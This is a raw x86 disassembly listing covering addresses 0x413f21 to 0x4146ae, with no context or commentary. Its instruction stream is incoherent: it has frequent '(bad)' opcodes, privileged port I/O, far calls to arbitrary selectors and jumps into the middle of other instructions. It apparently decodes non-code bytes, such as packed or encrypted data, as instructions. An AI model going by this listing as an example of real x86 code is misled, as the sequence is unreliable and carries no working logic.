  413f21:	ins    BYTE PTR es:[edi],dx
  413f22:	sub    DWORD PTR [eax+0x42],ebx
  413f25:	jmp    0x413ebd
  413f27:	push   edi
  413f28:	mov    ebx,0xe243a9b0
  413f2d:	and    BYTE PTR [ecx+ebx*1],0x54
  413f31:	fcom   QWORD PTR [ecx]
  413f33:	out    0xde,eax
  413f35:	fistp  DWORD PTR [ebp+0x53ad98e5]
  413f3b:	mov    esp,0x128e8412
  413f40:	stos   DWORD PTR es:[edi],eax
  413f41:	aad    0xe6
  413f43:	imul   edx,DWORD PTR [eax+0x1e],0x9cd6b91c
  413f4a:	in     al,dx
  413f4b:	mov    dl,0xd5
  413f4d:	js     0x413f0e
  413f4f:	adc    esi,eax
  413f51:	or     al,0x83
  413f53:	cmp    al,0x86
  413f55:	add    bh,dl
  413f57:	jmp    0x413f06
  413f59:	mov    bh,0x59
  413f5b:	cmp    ch,BYTE PTR [eax-0x62]
  413f5e:	jae    0x413ee1
  413f60:	push   0xffffffbe
  413f62:	sahf   
  413f63:	mov    dl,0x8d
  413f65:	out    dx,al
  413f66:	loopne 0x413ef4
  413f68:	inc    esp
  413f69:	(bad)  
  413f6b:	in     eax,dx
  413f6c:	pop    es
  413f6d:	jmp    0x413f73
  413f6f:	popf   
  413f70:	mov    edx,DWORD PTR [edi+0x2a]
  413f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f74:	or     dl,BYTE PTR [ebx]
  413f76:	jnp    0x413f73
  413f78:	cwde   
  413f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f7a:	pop    ds
  413f7b:	push   esi
  413f7c:	inc    ecx
  413f7d:	dec    esp
  413f7e:	cwde   
  413f7f:	test   DWORD PTR [ebp+0x3a],eax
  413f82:	cmc    
  413f83:	fldenv [ecx+0x56efd8eb]
  413f89:	call   0x40ab:0xdd3d44f
  413f90:	sbb    al,0x59
  413f92:	stc    
  413f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f94:	pop    ss
  413f95:	sub    al,0xb3
  413f97:	dec    ebx
  413f98:	outs   dx,BYTE PTR ds:[esi]
  413f99:	or     al,0x47
  413f9b:	pushf  
  413f9c:	sahf   
  413f9d:	(bad)  
  413f9e:	ins    DWORD PTR es:[edi],dx
  413f9f:	pop    esi
  413fa0:	jo     0x41400e
  413fa2:	inc    esp
  413fa3:	dec    ecx
  413fa4:	retf   
  413fa5:	xchg   esp,eax
  413fa6:	cmp    al,0x1
  413fa8:	sbb    dh,BYTE PTR [ecx+0x1b]
  413fab:	lods   al,BYTE PTR ds:[esi]
  413fac:	xor    esp,DWORD PTR [eax+0x15]
  413faf:	ret    
  413fb0:	iret   
  413fb1:	test   al,0xf8
  413fb3:	dec    eax
  413fb4:	ins    BYTE PTR es:[edi],dx
  413fb5:	in     al,dx
  413fb6:	test   al,0x4b
  413fb8:	pop    esp
  413fb9:	imul   eax,DWORD PTR [esi-0x14c4d8ac],0x7f
  413fc0:	ret    0xf645
  413fc3:	in     eax,dx
  413fc4:	or     BYTE PTR [esi],0xfc
  413fc7:	jp     0x413fd6
  413fc9:	scas   eax,DWORD PTR es:[edi]
  413fca:	or     al,ch
  413fcc:	(bad)  [esi+0x1b]
  413fcf:	das    
  413fd0:	add    bl,BYTE PTR [ecx-0x315e80dc]
  413fd6:	push   ebp
  413fd7:	fsub   QWORD PTR [edx-0x7760868e]
  413fdd:	cmp    DWORD PTR [ebp+0x5c57cc0b],0xfffffffa
  413fe4:	ja     0x414009
  413fe6:	fnstsw WORD PTR [ecx]
  413fe8:	dec    edi
  413fe9:	dec    edx
  413fea:	pop    ss
  413feb:	inc    ecx
  413fec:	loop   0x413fd1
  413fee:	pop    ecx
  413fef:	pop    esp
  413ff0:	jmp    0x413fa6
  413ff2:	push   ebp
  413ff3:	add    al,0xea
  413ff5:	add    DWORD PTR [ebp-0x5c],ebp
  413ff8:	xchg   esp,eax
  413ff9:	inc    edi
  413ffa:	and    dh,bh
  413ffc:	pop    eax
  413ffd:	and    al,0x96
  413fff:	iret   
  414000:	daa    
  414001:	mov    ch,0x4c
  414003:	xlat   BYTE PTR ds:[ebx]
  414004:	adc    al,cl
  414006:	lods   eax,DWORD PTR ds:[esi]
  414007:	je     0x413ff9
  414009:	push   edx
  41400a:	inc    esp
  41400b:	inc    ebx
  41400c:	push   es
  41400d:	mov    bl,0x90
  41400f:	arpl   bx,bp
  414011:	jl     0x41405c
  414013:	cld    
  414014:	pop    ebp
  414015:	pop    DWORD PTR [edi-0x3]
  414018:	sbb    BYTE PTR [edx-0xed3ee1],dl
  41401e:	je     0x413fcd
  414020:	jb     0x41400f
  414022:	scas   al,BYTE PTR es:[edi]
  414023:	jmp    0x81344b62
  414028:	imul   edx,DWORD PTR [edi-0x23fc9b3d],0xa23cd5e1
  414032:	mov    al,ds:0x3f59668b
  414037:	je     0x414012
  414039:	lock leave 
  41403b:	shr    BYTE PTR es:[edi-0x73],0xba
  414040:	or     eax,0x57def94
  414045:	fs cdq 
  414047:	inc    edx
  414048:	fidiv  WORD PTR [edx+0x56]
  41404b:	iret   
  41404c:	jns    0x41409a
  41404e:	retfw  
  414050:	int    0xb6
  414052:	ret    
  414053:	jg     0x4140a8
  414055:	xchg   edi,eax
  414056:	out    0x7,eax
  414058:	jnp    0x4140a2
  41405a:	push   ebx
  41405b:	dec    esp
  41405c:	sub    al,0x34
  41405e:	xchg   esi,eax
  41405f:	imul   ebx,DWORD PTR [edi],0xb1f750d2
  414065:	jae    0x4140b7
  414067:	(bad)  
  414068:	pop    ds
  414069:	and    DWORD PTR [esi],ebp
  41406b:	mov    ss,WORD PTR [ecx]
  41406d:	push   edx
  41406e:	pop    ebx
  41406f:	adc    esp,DWORD PTR [esi+0x4e]
  414072:	push   eax
  414073:	add    edx,DWORD PTR [eax+0x4a961fc3]
  414079:	xchg   ebp,eax
  41407a:	or     DWORD PTR [eax+0x54],edi
  41407d:	pop    ecx
  41407e:	mov    BYTE PTR [ecx-0x47],al
  414081:	pop    edi
  414082:	pop    edx
  414083:	test   eax,0xb5abad05
  414088:	div    DWORD PTR [ebp-0x7e659021]
  41408e:	loopne 0x414026
  414090:	mov    ebp,0xb9bd576
  414095:	fst    QWORD PTR [esi-0x68f7cb46]
  41409b:	dec    ecx
  41409c:	jmp    0xc1fe:0x4e115b3f
  4140a3:	inc    ecx
  4140a4:	test   DWORD PTR [ebx-0x2b080e91],ecx
  4140aa:	arpl   WORD PTR [ebx],ax
  4140ac:	xor    edx,DWORD PTR [ebx]
  4140ae:	stos   BYTE PTR es:[edi],al
  4140af:	pop    esi
  4140b0:	and    al,BYTE PTR [ecx]
  4140b2:	out    0x3c,eax
  4140b4:	mov    edx,0x93a36bda
  4140b9:	mov    eax,ds:0xc44fbf03
  4140be:	out    0x83,al
  4140c0:	inc    ecx
  4140c1:	(bad)  [ecx+ebp*1]
  4140c4:	repz dec edi
  4140c6:	stos   BYTE PTR es:[edi],al
  4140c7:	mov    eax,DWORD PTR [ebx+0x14544e5c]
  4140cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ce:	outs   dx,BYTE PTR ds:[esi]
  4140cf:	daa    
  4140d0:	es xor esi,edx
  4140d3:	shl    DWORD PTR [edx+0x4],1
  4140d6:	lock outs dx,BYTE PTR ds:[esi]
  4140d8:	cmp    BYTE PTR [esi],al
  4140da:	movmskps eax,xmm0
  4140dd:	sub    al,0xb1
  4140df:	xor    BYTE PTR [edi+esi*2-0x1b],bl
  4140e3:	ficomp DWORD PTR [eax+esi*2-0x51e0ae52]
  4140ea:	xchg   esi,eax
  4140eb:	pop    ss
  4140ec:	fist   DWORD PTR [eax]
  4140ee:	mov    ds:0x15f4580b,eax
  4140f3:	(bad)  
  4140f4:	sub    eax,0xd02eae7
  4140f9:	inc    ebp
  4140fa:	push   esi
  4140fb:	out    dx,eax
  4140fc:	imul   esi,DWORD PTR [ebx-0x10],0x8eb57d29
  414103:	xor    bl,BYTE PTR [edx]
  414105:	add    eax,0x7c6cc7ea
  41410a:	and    BYTE PTR [edi],dh
  41410c:	push   esp
  41410d:	inc    ebp
  41410e:	mov    dl,0xc1
  414110:	es out dx,eax
  414112:	sbb    edx,DWORD PTR [edx-0x62c743aa]
  414118:	mov    edx,0xe0cb83df
  41411d:	rcr    BYTE PTR [eax+0x6f49cb1],0x50
  414124:	or     al,0x28
  414126:	outs   dx,BYTE PTR ds:[esi]
  414127:	add    bh,BYTE PTR [esi+ebx*8+0x73ed8614]
  41412e:	mov    ds:0xa536e8ed,eax
  414133:	das    
  414134:	lock sbb ecx,DWORD PTR [eax+0x68]
  414138:	dec    ebx
  414139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41413a:	inc    esi
  41413b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41413c:	in     al,0x14
  41413e:	pop    edx
  41413f:	sbb    al,0x20
  414141:	adc    ecx,DWORD PTR [ebx]
  414143:	mov    bh,dl
  414145:	xchg   esp,eax
  414146:	lds    ecx,FWORD PTR [ecx+eax*4]
  414149:	ret    0x9850
  41414c:	lock nop
  41414e:	cmp    al,0x38
  414150:	xor    edi,ebx
  414152:	adc    ch,BYTE PTR [edx-0x32cbe365]
  414158:	int    0xd
  41415a:	inc    edi
  41415b:	pop    ecx
  41415c:	popf   
  41415d:	movhlps xmm5,xmm6
  414160:	int    0x9a
  414162:	cli    
  414163:	jle    0x41416c
  414165:	mov    ds:0xa48d6c87,al
  41416a:	jle    0x414103
  41416c:	fld    st(4)
  41416e:	inc    edi
  41416f:	adc    dh,ah
  414171:	inc    edx
  414172:	or     esp,esp
  414174:	jns    0x414109
  414176:	dec    edx
  414177:	out    0x7e,al
  414179:	popf   
  41417a:	add    DWORD PTR [edi+ecx*2],esi
  41417d:	fimul  DWORD PTR [ebp+0x4fe5e2c8]
  414183:	pop    edi
  414184:	pop    ds
  414185:	sub    ch,BYTE PTR ds:[edx+0x4f]
  414189:	sbb    ch,BYTE PTR [ebx-0x6e266d4f]
  41418f:	sub    ebx,ebp
  414191:	leave  
  414192:	scas   al,BYTE PTR es:[edi]
  414193:	mov    DWORD PTR [edi],0x6ae387b5
  414199:	mov    bh,0x94
  41419b:	cmp    DWORD PTR [eax],edi
  41419d:	inc    ebx
  41419e:	je     0x41417d
  4141a0:	mov    WORD PTR [ebx+0x27],ss
  4141a3:	and    eax,0x7f571409
  4141a8:	pop    esi
  4141a9:	xlat   BYTE PTR ds:[ebx]
  4141aa:	mov    bl,0xeb
  4141ac:	fcmovnbe st,st(4)
  4141ae:	push   eax
  4141af:	mov    DWORD PTR [esi],ebp
  4141b1:	inc    esi
  4141b2:	adc    BYTE PTR [ecx+0x9a94747],al
  4141b8:	inc    eax
  4141b9:	sbb    BYTE PTR [edx+0x34],al
  4141bc:	(bad)  
  4141bd:	xchg   ebp,eax
  4141be:	pop    eax
  4141bf:	xchg   ebp,eax
  4141c0:	push   cs
  4141c1:	pusha  
  4141c2:	inc    eax
  4141c3:	(bad)  
  4141c5:	and    esi,DWORD PTR [ecx-0x74]
  4141c8:	jp     0x414193
  4141ca:	dec    eax
  4141cb:	sti    
  4141cc:	es scas eax,DWORD PTR es:[edi]
  4141ce:	jnp    0x41424f
  4141d0:	scas   al,BYTE PTR es:[edi]
  4141d1:	xchg   BYTE PTR [ebx-0x1fb53736],cl
  4141d7:	jge    0x4141a1
  4141d9:	scas   eax,DWORD PTR es:[edi]
  4141da:	xchg   DWORD PTR [esi],edx
  4141dc:	or     al,0x5a
  4141de:	mov    ebp,0x1fda8a8a
  4141e3:	dec    ecx
  4141e4:	seto   BYTE PTR [eax-0x17]
  4141e8:	fs loop 0x414266
  4141eb:	fld    DWORD PTR ds:0x2baadb9d
  4141f1:	mov    edi,0x5629be17
  4141f6:	cld    
  4141f7:	fisttp WORD PTR [eax]
  4141f9:	outs   dx,BYTE PTR ds:[esi]
  4141fa:	fild   DWORD PTR [bx+di-0x5d]
  4141fe:	jmp    0x414216
  414200:	into   
  414201:	and    cl,BYTE PTR ds:0xa9adb64b
  414207:	into   
  414208:	imul   edi,ebp,0x70
  41420b:	mov    dl,ch
  41420d:	mov    edx,0x8e3b4d54
  414212:	cdq    
  414213:	sub    BYTE PTR ds:[edi-0x29b89d83],bl
  41421a:	loope  0x4141b8
  41421c:	mov    cl,0x95
  41421e:	stc    
  41421f:	jno    0x4141ab
  414221:	mov    WORD PTR [edx],ds
  414223:	je     0x414210
  414225:	stc    
  414226:	repz jmp 0x2994004a
  41422c:	das    
  41422d:	cmp    edi,DWORD PTR [esi-0x75]
  414230:	dec    esi
  414231:	sbb    al,0x95
  414233:	pop    ebp
  414234:	fisttp WORD PTR [edx+0x65]
  414237:	inc    edi
  414238:	sub    eax,0x7415cddc
  41423d:	inc    ebp
  41423e:	and    bh,0x66
  414241:	fcom   QWORD PTR [eax+eax*8]
  414244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414245:	pop    ebp
  414246:	adc    BYTE PTR [esi-0x6a],dl
  414249:	sbb    ch,BYTE PTR [esi+edi*4]
  41424c:	bound  eax,QWORD PTR [edi+0x3f]
  41424f:	or     cl,al
  414251:	mov    WORD PTR [ecx],?
  414253:	retf   0x2e6
  414256:	shr    BYTE PTR [edi+0x1b],cl
  414259:	(bad)  [edx]
  41425b:	push   edi
  41425c:	inc    ecx
  41425d:	inc    ebp
  41425e:	push   ebx
  41425f:	cdq    
  414260:	pop    ecx
  414261:	add    DWORD PTR [esp+eax*4],0xbc1b3628
  414268:	cs scas al,BYTE PTR es:[edi]
  41426a:	cmp    ebx,edi
  41426c:	aad    0x79
  41426e:	(bad)  
  41426f:	pop    ds
  414270:	mov    bh,0x8b
  414272:	mov    bl,0xed
  414274:	js     0x4142e5
  414276:	test   DWORD PTR [ecx-0x20],0x402ff49f
  41427d:	sbb    bh,BYTE PTR [esi+0x1f562f8d]
  414283:	inc    edx
  414284:	loop   0x41423f
  414286:	je     0x414212
  414288:	mov    ds,WORD PTR ds:[edx+edi*2]
  41428c:	sub    dl,al
  41428e:	jmp    DWORD PTR [edx-0x7611156b]
  414294:	pop    ebp
  414295:	sub    eax,eax
  414297:	out    0xf1,al
  414299:	ss mov ah,0x9c
  41429c:	lods   al,BYTE PTR ds:[esi]
  41429d:	aas    
  41429e:	push   ss
  41429f:	lahf   
  4142a0:	popa   
  4142a1:	push   ds
  4142a2:	shl    DWORD PTR [eax+0x41758cec],0xb7
  4142a9:	aad    0x5e
  4142ab:	out    dx,eax
  4142ac:	ds push edi
  4142ae:	shr    al,cl
  4142b0:	call   0xf2a6:0xe5d3a020
  4142b7:	(bad)  
  4142b8:	fisub  WORD PTR [ecx+0x24]
  4142bb:	xchg   ebx,eax
  4142bc:	pop    edx
  4142bd:	cdq    
  4142be:	xchg   esi,eax
  4142bf:	outs   dx,BYTE PTR ds:[esi]
  4142c0:	pop    ebx
  4142c1:	mov    edi,0xaf6d1f62
  4142c6:	push   ss
  4142c7:	lods   al,BYTE PTR ds:[esi]
  4142c8:	fwait
  4142c9:	xor    ecx,DWORD PTR [edi-0x7a]
  4142cc:	fst    st(5)
  4142ce:	mov    ebp,0x42314d54
  4142d3:	sbb    al,0xc2
  4142d5:	clc    
  4142d6:	rcr    BYTE PTR ds:0x1d88341e,0xc9
  4142dd:	fwait
  4142de:	cmp    al,0x35
  4142e0:	dec    esi
  4142e1:	hlt    
  4142e2:	retf   
  4142e3:	(bad)  
  4142e4:	ins    DWORD PTR es:[edi],dx
  4142e5:	or     eax,0xa39a94da
  4142ea:	add    al,0x3a
  4142ec:	jnp    0x4142fe
  4142ee:	push   cs
  4142ef:	loope  0x41435d
  4142f1:	inc    esi
  4142f2:	jns    0x41427d
  4142f4:	mov    BYTE PTR [esi+0x5],bl
  4142f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142f8:	mov    ebp,0x19aacfa
  4142fd:	pop    edx
  4142fe:	cmp    DWORD PTR [eax+0x2304d556],edi
  414304:	es in  eax,0x2e
  414307:	arpl   WORD PTR [ebp-0x133a5dd0],bx
  41430d:	std    
  41430e:	call   0x3099:0x9003433b
  414315:	xlat   BYTE PTR ds:[ebx]
  414316:	push   eax
  414317:	pop    edx
  414318:	and    BYTE PTR [eax-0x5c],dh
  41431b:	loop   0x41431f
  41431d:	push   ecx
  41431e:	push   esp
  41431f:	jb     0x4142a3
  414321:	xchg   ebx,eax
  414322:	cwde   
  414323:	scas   eax,DWORD PTR es:[edi]
  414324:	addr16 (bad) 
  414326:	scas   eax,DWORD PTR es:[edi]
  414327:	mov    ah,0x5f
  414329:	sbb    edx,DWORD PTR [edi-0x24]
  41432c:	xchg   ebp,eax
  41432d:	test   ch,0xae
  414330:	sub    DWORD PTR [bx+di-0x76],esp
  414334:	outs   dx,BYTE PTR ds:[esi]
  414335:	inc    eax
  414336:	mov    dl,cl
  414338:	jp     0xbd875668
  41433e:	mov    ds:0x64a9e90e,eax
  414343:	push   edx
  414344:	ins    BYTE PTR es:[edi],dx
  414345:	push   0x34bf727b
  41434a:	dec    ebp
  41434b:	xchg   edi,eax
  41434c:	add    eax,0xd63630d1
  414351:	mov    dh,0x62
  414353:	lock adc al,0x36
  414356:	mov    ah,BYTE PTR [edi+ebx*1]
  414359:	repnz test ebx,0x21ba88f4
  414360:	mov    dh,0xfd
  414362:	adc    BYTE PTR [eax-0x70e23e64],ah
  414368:	mov    ecx,esp
  41436a:	stos   BYTE PTR es:[edi],al
  41436b:	call   0x35e:0xb4c4e72f
  414372:	cmp    DWORD PTR [edx],0xb197620
  414378:	(bad)  
  414379:	push   0x853a87f4
  41437e:	pop    eax
  41437f:	lock or edi,ecx
  414382:	js     0x41438b
  414384:	xchg   esp,eax
  414385:	jl     0x414343
  414387:	movd   DWORD PTR [ecx+0x7a],mm2
  41438b:	jo     0x4143eb
  41438d:	xchg   ebp,eax
  41438e:	mov    al,ds:0x29c184c5
  414393:	movq   mm5,QWORD PTR [esi-0x54]
  414397:	mov    ds:0x72ad059e,al
  41439c:	pop    edx
  41439d:	(bad)  
  41439e:	lds    ebx,FWORD PTR [eax]
  4143a0:	sar    BYTE PTR [edi+0x3],1
  4143a3:	pop    esi
  4143a4:	or     BYTE PTR [edi-0x2fca9a9],dh
  4143aa:	out    0x3e,al
  4143ac:	xchg   edi,eax
  4143ad:	retf   0x8c37
  4143b0:	add    esi,0x2c
  4143b3:	mov    cl,0xd7
  4143b5:	pop    ds
  4143b6:	sub    esp,DWORD PTR [ebx+0x42]
  4143b9:	lock push 0xcbb56e84
  4143bf:	or     ah,BYTE PTR [ebp-0x7c82e465]
  4143c5:	cli    
  4143c6:	or     bl,al
  4143c8:	adc    dh,bh
  4143ca:	aaa    
  4143cb:	mov    eax,0xabce8928
  4143d0:	pop    esi
  4143d1:	pop    esi
  4143d2:	add    DWORD PTR [edx-0x2c],esp
  4143d5:	test   DWORD PTR [ebx],ebx
  4143d7:	mov    dh,0xab
  4143d9:	inc    ebp
  4143da:	jecxz  0x414367
  4143dc:	mov    ds,WORD PTR [edi-0x66]
  4143df:	test   al,0x3c
  4143e1:	in     eax,dx
  4143e2:	mov    BYTE PTR [eax+eiz*2],ah
  4143e5:	push   esp
  4143e6:	mov    DWORD PTR [ecx],eax
  4143e8:	popa   
  4143e9:	mov    ah,dh
  4143eb:	les    esi,FWORD PTR [ebp+0x20]
  4143ee:	jp     0x414401
  4143f0:	cmp    al,0x7c
  4143f2:	data16 mov cl,0x43
  4143f5:	push   0x40968314
  4143fa:	push   ebx
  4143fb:	xchg   ebx,eax
  4143fc:	dec    edi
  4143fd:	pop    ecx
  4143fe:	js     0x41441a
  414400:	cmc    
  414401:	mov    bl,0xa0
  414403:	push   eax
  414404:	mov    WORD PTR [edx-0x365049fd],cs
  41440a:	ja     0x4143ab
  41440c:	fisttp DWORD PTR [eax-0x45]
  41440f:	add    BYTE PTR [eax+0x38ac69ef],al
  414415:	es ret 0x79f9
  414419:	mov    ebx,0xabad63c9
  41441e:	arpl   bp,ax
  414420:	mov    BYTE PTR [ebp-0x6c],dl
  414423:	pop    esp
  414424:	jne    0x41443c
  414426:	mov    dl,0x1e
  414428:	call   0xf7349ef6
  41442d:	mov    esp,0x8d495145
  414432:	mov    ebx,DWORD PTR [ebp+ebp*2-0x17dc7fa5]
  414439:	push   esi
  41443a:	pushf  
  41443b:	sub    bh,BYTE PTR [esi]
  41443d:	stos   BYTE PTR es:[edi],al
  41443e:	push   edx
  41443f:	mov    ah,0x15
  414441:	iret   
  414442:	fwait
  414443:	jne    0x414468
  414445:	jle    0x4143e2
  414447:	mov    edx,0x73103719
  41444c:	jp     0x4144a4
  41444e:	sub    eax,0x4bf56fad
  414453:	aad    0xb1
  414455:	fistp  QWORD PTR [edi+edi*2+0x67034b98]
  41445c:	bound  esi,QWORD PTR [ecx+ebx*4-0x6]
  414460:	stc    
  414461:	rcl    ch,1
  414463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414464:	xchg   ecx,eax
  414465:	push   0xffffffe8
  414467:	fwait
  414468:	xchg   edx,eax
  414469:	dec    esi
  41446a:	mov    bl,0xcc
  41446c:	ds add esp,ebx
  41446f:	pop    ds
  414470:	hlt    
  414471:	in     eax,dx
  414472:	mov    fs,ebp
  414474:	cmp    dh,BYTE PTR [esi-0x49cd624d]
  41447a:	test   al,0x99
  41447c:	cmp    DWORD PTR [edi],ebx
  41447e:	shl    ch,0xb
  414481:	and    BYTE PTR [edi-0x4e],bl
  414484:	jbe    0x4144ca
  414486:	push   ecx
  414487:	aas    
  414488:	pop    edi
  414489:	rcr    DWORD PTR [esp+edi*4-0x3ef1247a],1
  414490:	push   cs
  414491:	mov    ds:0x3cba4dbb,eax
  414496:	push   esp
  414497:	dec    ebx
  414498:	add    DWORD PTR [ebx+esi*2],esi
  41449b:	xor    al,0xee
  41449d:	stos   DWORD PTR es:[edi],eax
  41449e:	mov    esi,0x7b36be64
  4144a3:	loopne 0x414487
  4144a5:	xor    eax,0x388b5cf4
  4144aa:	out    dx,al
  4144ab:	das    
  4144ac:	mov    WORD PTR [ebx],es
  4144ae:	inc    edi
  4144af:	mov    eax,0xb3e69c41
  4144b4:	test   eax,0x7dcbf15a
  4144b9:	pop    ecx
  4144ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144bb:	nop
  4144bc:	cmp    edi,esi
  4144be:	pushf  
  4144bf:	ins    BYTE PTR es:[edi],dx
  4144c0:	test   DWORD PTR ds:0x3cc69955,edx
  4144c6:	inc    esp
  4144c7:	inc    ecx
  4144c8:	mov    cl,0x67
  4144ca:	retf   0x5476
  4144cd:	getsec 
  4144cf:	jge    0x41446f
  4144d1:	adc    ebp,DWORD PTR [ebx-0x391ca85f]
  4144d7:	pop    ebx
  4144d8:	(bad)  
  4144d9:	fidivr WORD PTR [ecx-0x37ca9154]
  4144df:	popf   
  4144e0:	shl    BYTE PTR [ebx],1
  4144e2:	and    DWORD PTR [edx-0x5],edi
  4144e5:	mov    ecx,0x4b0c609f
  4144ea:	pop    esp
  4144eb:	ins    BYTE PTR es:[edi],dx
  4144ec:	xchg   ebx,eax
  4144ed:	les    esp,FWORD PTR [ebx]
  4144ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144f0:	mov    edx,0xc678b5ba
  4144f5:	jl     0x41451d
  4144f7:	fdivr  QWORD PTR [edi]
  4144f9:	into   
  4144fa:	mov    cl,0xbd
  4144fc:	pop    edi
  4144fd:	inc    eax
  4144fe:	out    0x79,al
  414500:	arpl   WORD PTR [eax+ebp*8+0x3c786672],bp
  414507:	cli    
  414508:	bswap  esi
  41450a:	dec    ecx
  41450b:	xchg   esi,eax
  41450c:	das    
  41450d:	mov    esi,0xfb9ba488
  414512:	scas   al,BYTE PTR es:[edi]
  414513:	mov    BYTE PTR [ebx-0x63],ah
  414516:	rcr    DWORD PTR [edi-0x6],1
  414519:	sub    eax,0xf9701ca9
  41451e:	adc    DWORD PTR [esi-0x2],0x39
  414522:	sbb    DWORD PTR [eax+eax*1+0x3866c99c],0x1970ebe4
  41452d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41452e:	pop    eax
  41452f:	adc    ah,ah
  414531:	cbw    
  414533:	pop    ss
  414534:	cdq    
  414535:	popa   
  414536:	dec    eax
  414537:	(bad)  
  414539:	pop    eax
  41453a:	jge    0x414580
  41453c:	pmulhuw mm4,QWORD PTR [esi]
  41453f:	test   ch,ch
  414541:	ja     0x414536
  414543:	test   DWORD PTR [edx+edi*2-0x5c0e8d7d],ebx
  41454a:	adc    DWORD PTR [ecx-0x257581],edx
  414550:	hlt    
  414551:	sahf   
  414552:	into   
  414553:	sbb    DWORD PTR [ecx-0x7d],esi
  414556:	pop    ds
  414557:	ret    0x7b18
  41455a:	ret    0xbf72
  41455d:	dec    edx
  41455e:	(bad)  
  41455f:	or     esi,DWORD PTR [esi+eax*1-0x52070141]
  414566:	imul   eax,DWORD PTR [edx+0x16],0x616f31f
  41456d:	xchg   edx,eax
  41456e:	gs es push 0x57
  414572:	in     eax,dx
  414573:	cmp    al,0x70
  414575:	push   eax
  414576:	mov    eax,0x398e1ca
  41457b:	inc    ebp
  41457c:	and    al,0xb0
  41457e:	inc    ebp
  41457f:	push   0xb8ab1053
  414584:	je     0x41455e
  414586:	sbb    ecx,ebp
  414588:	test   esi,eax
  41458a:	pop    ecx
  41458b:	fimul  DWORD PTR [eax+0x2de87989]
  414591:	push   es
  414592:	adc    eax,0x39894665
  414597:	data16 jns 0x414548
  41459a:	mov    dh,0xcf
  41459c:	mov    cl,0xc2
  41459e:	xchg   edx,eax
  41459f:	stos   BYTE PTR es:[edi],al
  4145a0:	loopne 0x414578
  4145a2:	add    eax,0x8df9d88f
  4145a7:	and    edi,esi
  4145a9:	shr    DWORD PTR [eax+0x618bbad8],cl
  4145af:	mov    dl,0x8f
  4145b1:	fs ret 
  4145b3:	xor    al,0xdf
  4145b5:	xchg   esi,eax
  4145b6:	dec    edi
  4145b7:	stos   DWORD PTR es:[edi],eax
  4145b8:	pop    ebp
  4145b9:	push   cs
  4145ba:	shr    esi,cl
  4145bc:	add    BYTE PTR [esi],bl
  4145be:	mov    BYTE PTR [edi-0x2e],bl
  4145c1:	adc    ch,bh
  4145c3:	mov    ebp,0xf6b3be4a
  4145c8:	pop    edx
  4145c9:	and    bl,BYTE PTR [ebx+ebx*4+0x0]
  4145cd:	mov    ecx,0xb49b6cfa
  4145d2:	mov    esi,0x1d25a77f
  4145d7:	and    DWORD PTR [ebp+0x3c],edx
  4145da:	inc    ecx
  4145db:	xor    ah,ah
  4145dd:	dec    edi
  4145de:	stos   DWORD PTR es:[edi],eax
  4145df:	xchg   edi,eax
  4145e0:	fnsave ds:[esi+0x48a7e1a3]
  4145e7:	jae    0x4145e9
  4145e9:	(bad)  
  4145ea:	mov    esp,0x6d7965fd
  4145ef:	mov    ecx,0xc6b8a885
  4145f4:	jmp    0xba38:0x4acda140
  4145fb:	es jnp 0x41463a
  4145fe:	pop    ss
  4145ff:	jo     0x41464e
  414601:	mov    ah,0xf0
  414603:	sub    ebx,edx
  414605:	icebp  
  414606:	add    eax,0x7fa61d61
  41460b:	jns    0x414606
  41460d:	shl    DWORD PTR [ecx-0x6b],1
  414610:	test   DWORD PTR es:[esi-0x7576e67c],eax
  414617:	inc    ebp
  414618:	fbld   TBYTE PTR [eax]
  41461a:	ins    BYTE PTR es:[edi],dx
  41461b:	xchg   ebp,eax
  41461c:	scas   al,BYTE PTR es:[edi]
  41461d:	xchg   DWORD PTR [edx+0x3bacb1d3],ebx
  414623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414624:	inc    ecx
  414625:	add    esi,DWORD PTR [edx]
  414627:	test   eax,0x86bc124f
  41462c:	test   DWORD PTR [edx-0x71],edi
  41462f:	push   ecx
  414630:	addr16 dec edi
  414632:	out    0x55,eax
  414634:	add    eax,0x2e6512cd
  414639:	sub    eax,DWORD PTR [ebx+0x7e2890f7]
  41463f:	push   0x13
  414641:	pop    es
  414642:	leave  
  414643:	out    dx,al
  414644:	jp     0x414682
  414646:	sub    esi,DWORD PTR [eax+0x6110f77]
  41464c:	jg     0x414623
  41464e:	(bad)  
  41464f:	mov    edx,0x4d461dfd
  414654:	jp     0x414694
  414656:	repz cmc 
  414658:	clc    
  414659:	lods   al,BYTE PTR ds:[esi]
  41465a:	lods   eax,DWORD PTR ds:[esi]
  41465b:	ins    BYTE PTR es:[edi],dx
  41465c:	rep ins DWORD PTR es:[edi],dx
  41465e:	fidivr WORD PTR [eax]
  414660:	push   es
  414661:	aam    0xb3
  414663:	inc    ecx
  414664:	pop    esp
  414665:	aaa    
  414666:	dec    esp
  414667:	lds    ebx,FWORD PTR ds:0xede2cd34
  41466d:	adc    al,0x17
  41466f:	clc    
  414670:	lahf   
  414671:	es add eax,0x281fe27
  414677:	adc    al,0x24
  414679:	aas    
  41467a:	sub    al,0xbb
  41467c:	call   0x15c870b
  414681:	adc    al,0xba
  414683:	out    0xcc,al
  414685:	fcmovne st,st(4)
  414687:	loope  0x4146e5
  414689:	retf   
  41468a:	inc    eax
  41468b:	and    eax,0xb94e0a97
  414690:	push   0xec67764b
  414695:	cwde   
  414696:	xor    BYTE PTR [ecx+0xa42642e],ch
  41469c:	(bad)  
  41469e:	stc    
  41469f:	jbe    0x4146cb
  4146a1:	daa    
  4146a2:	push   edi
  4146a3:	scas   al,BYTE PTR es:[edi]
  4146a4:	iret   
  4146a5:	xor    BYTE PTR [edx+0x59],0x9c
  4146a9:	jo     0x414671
  4146ab:	fnsave [ebx]
  4146ad:	(bad)  
  4146ae:	jmp    0xe95604ef
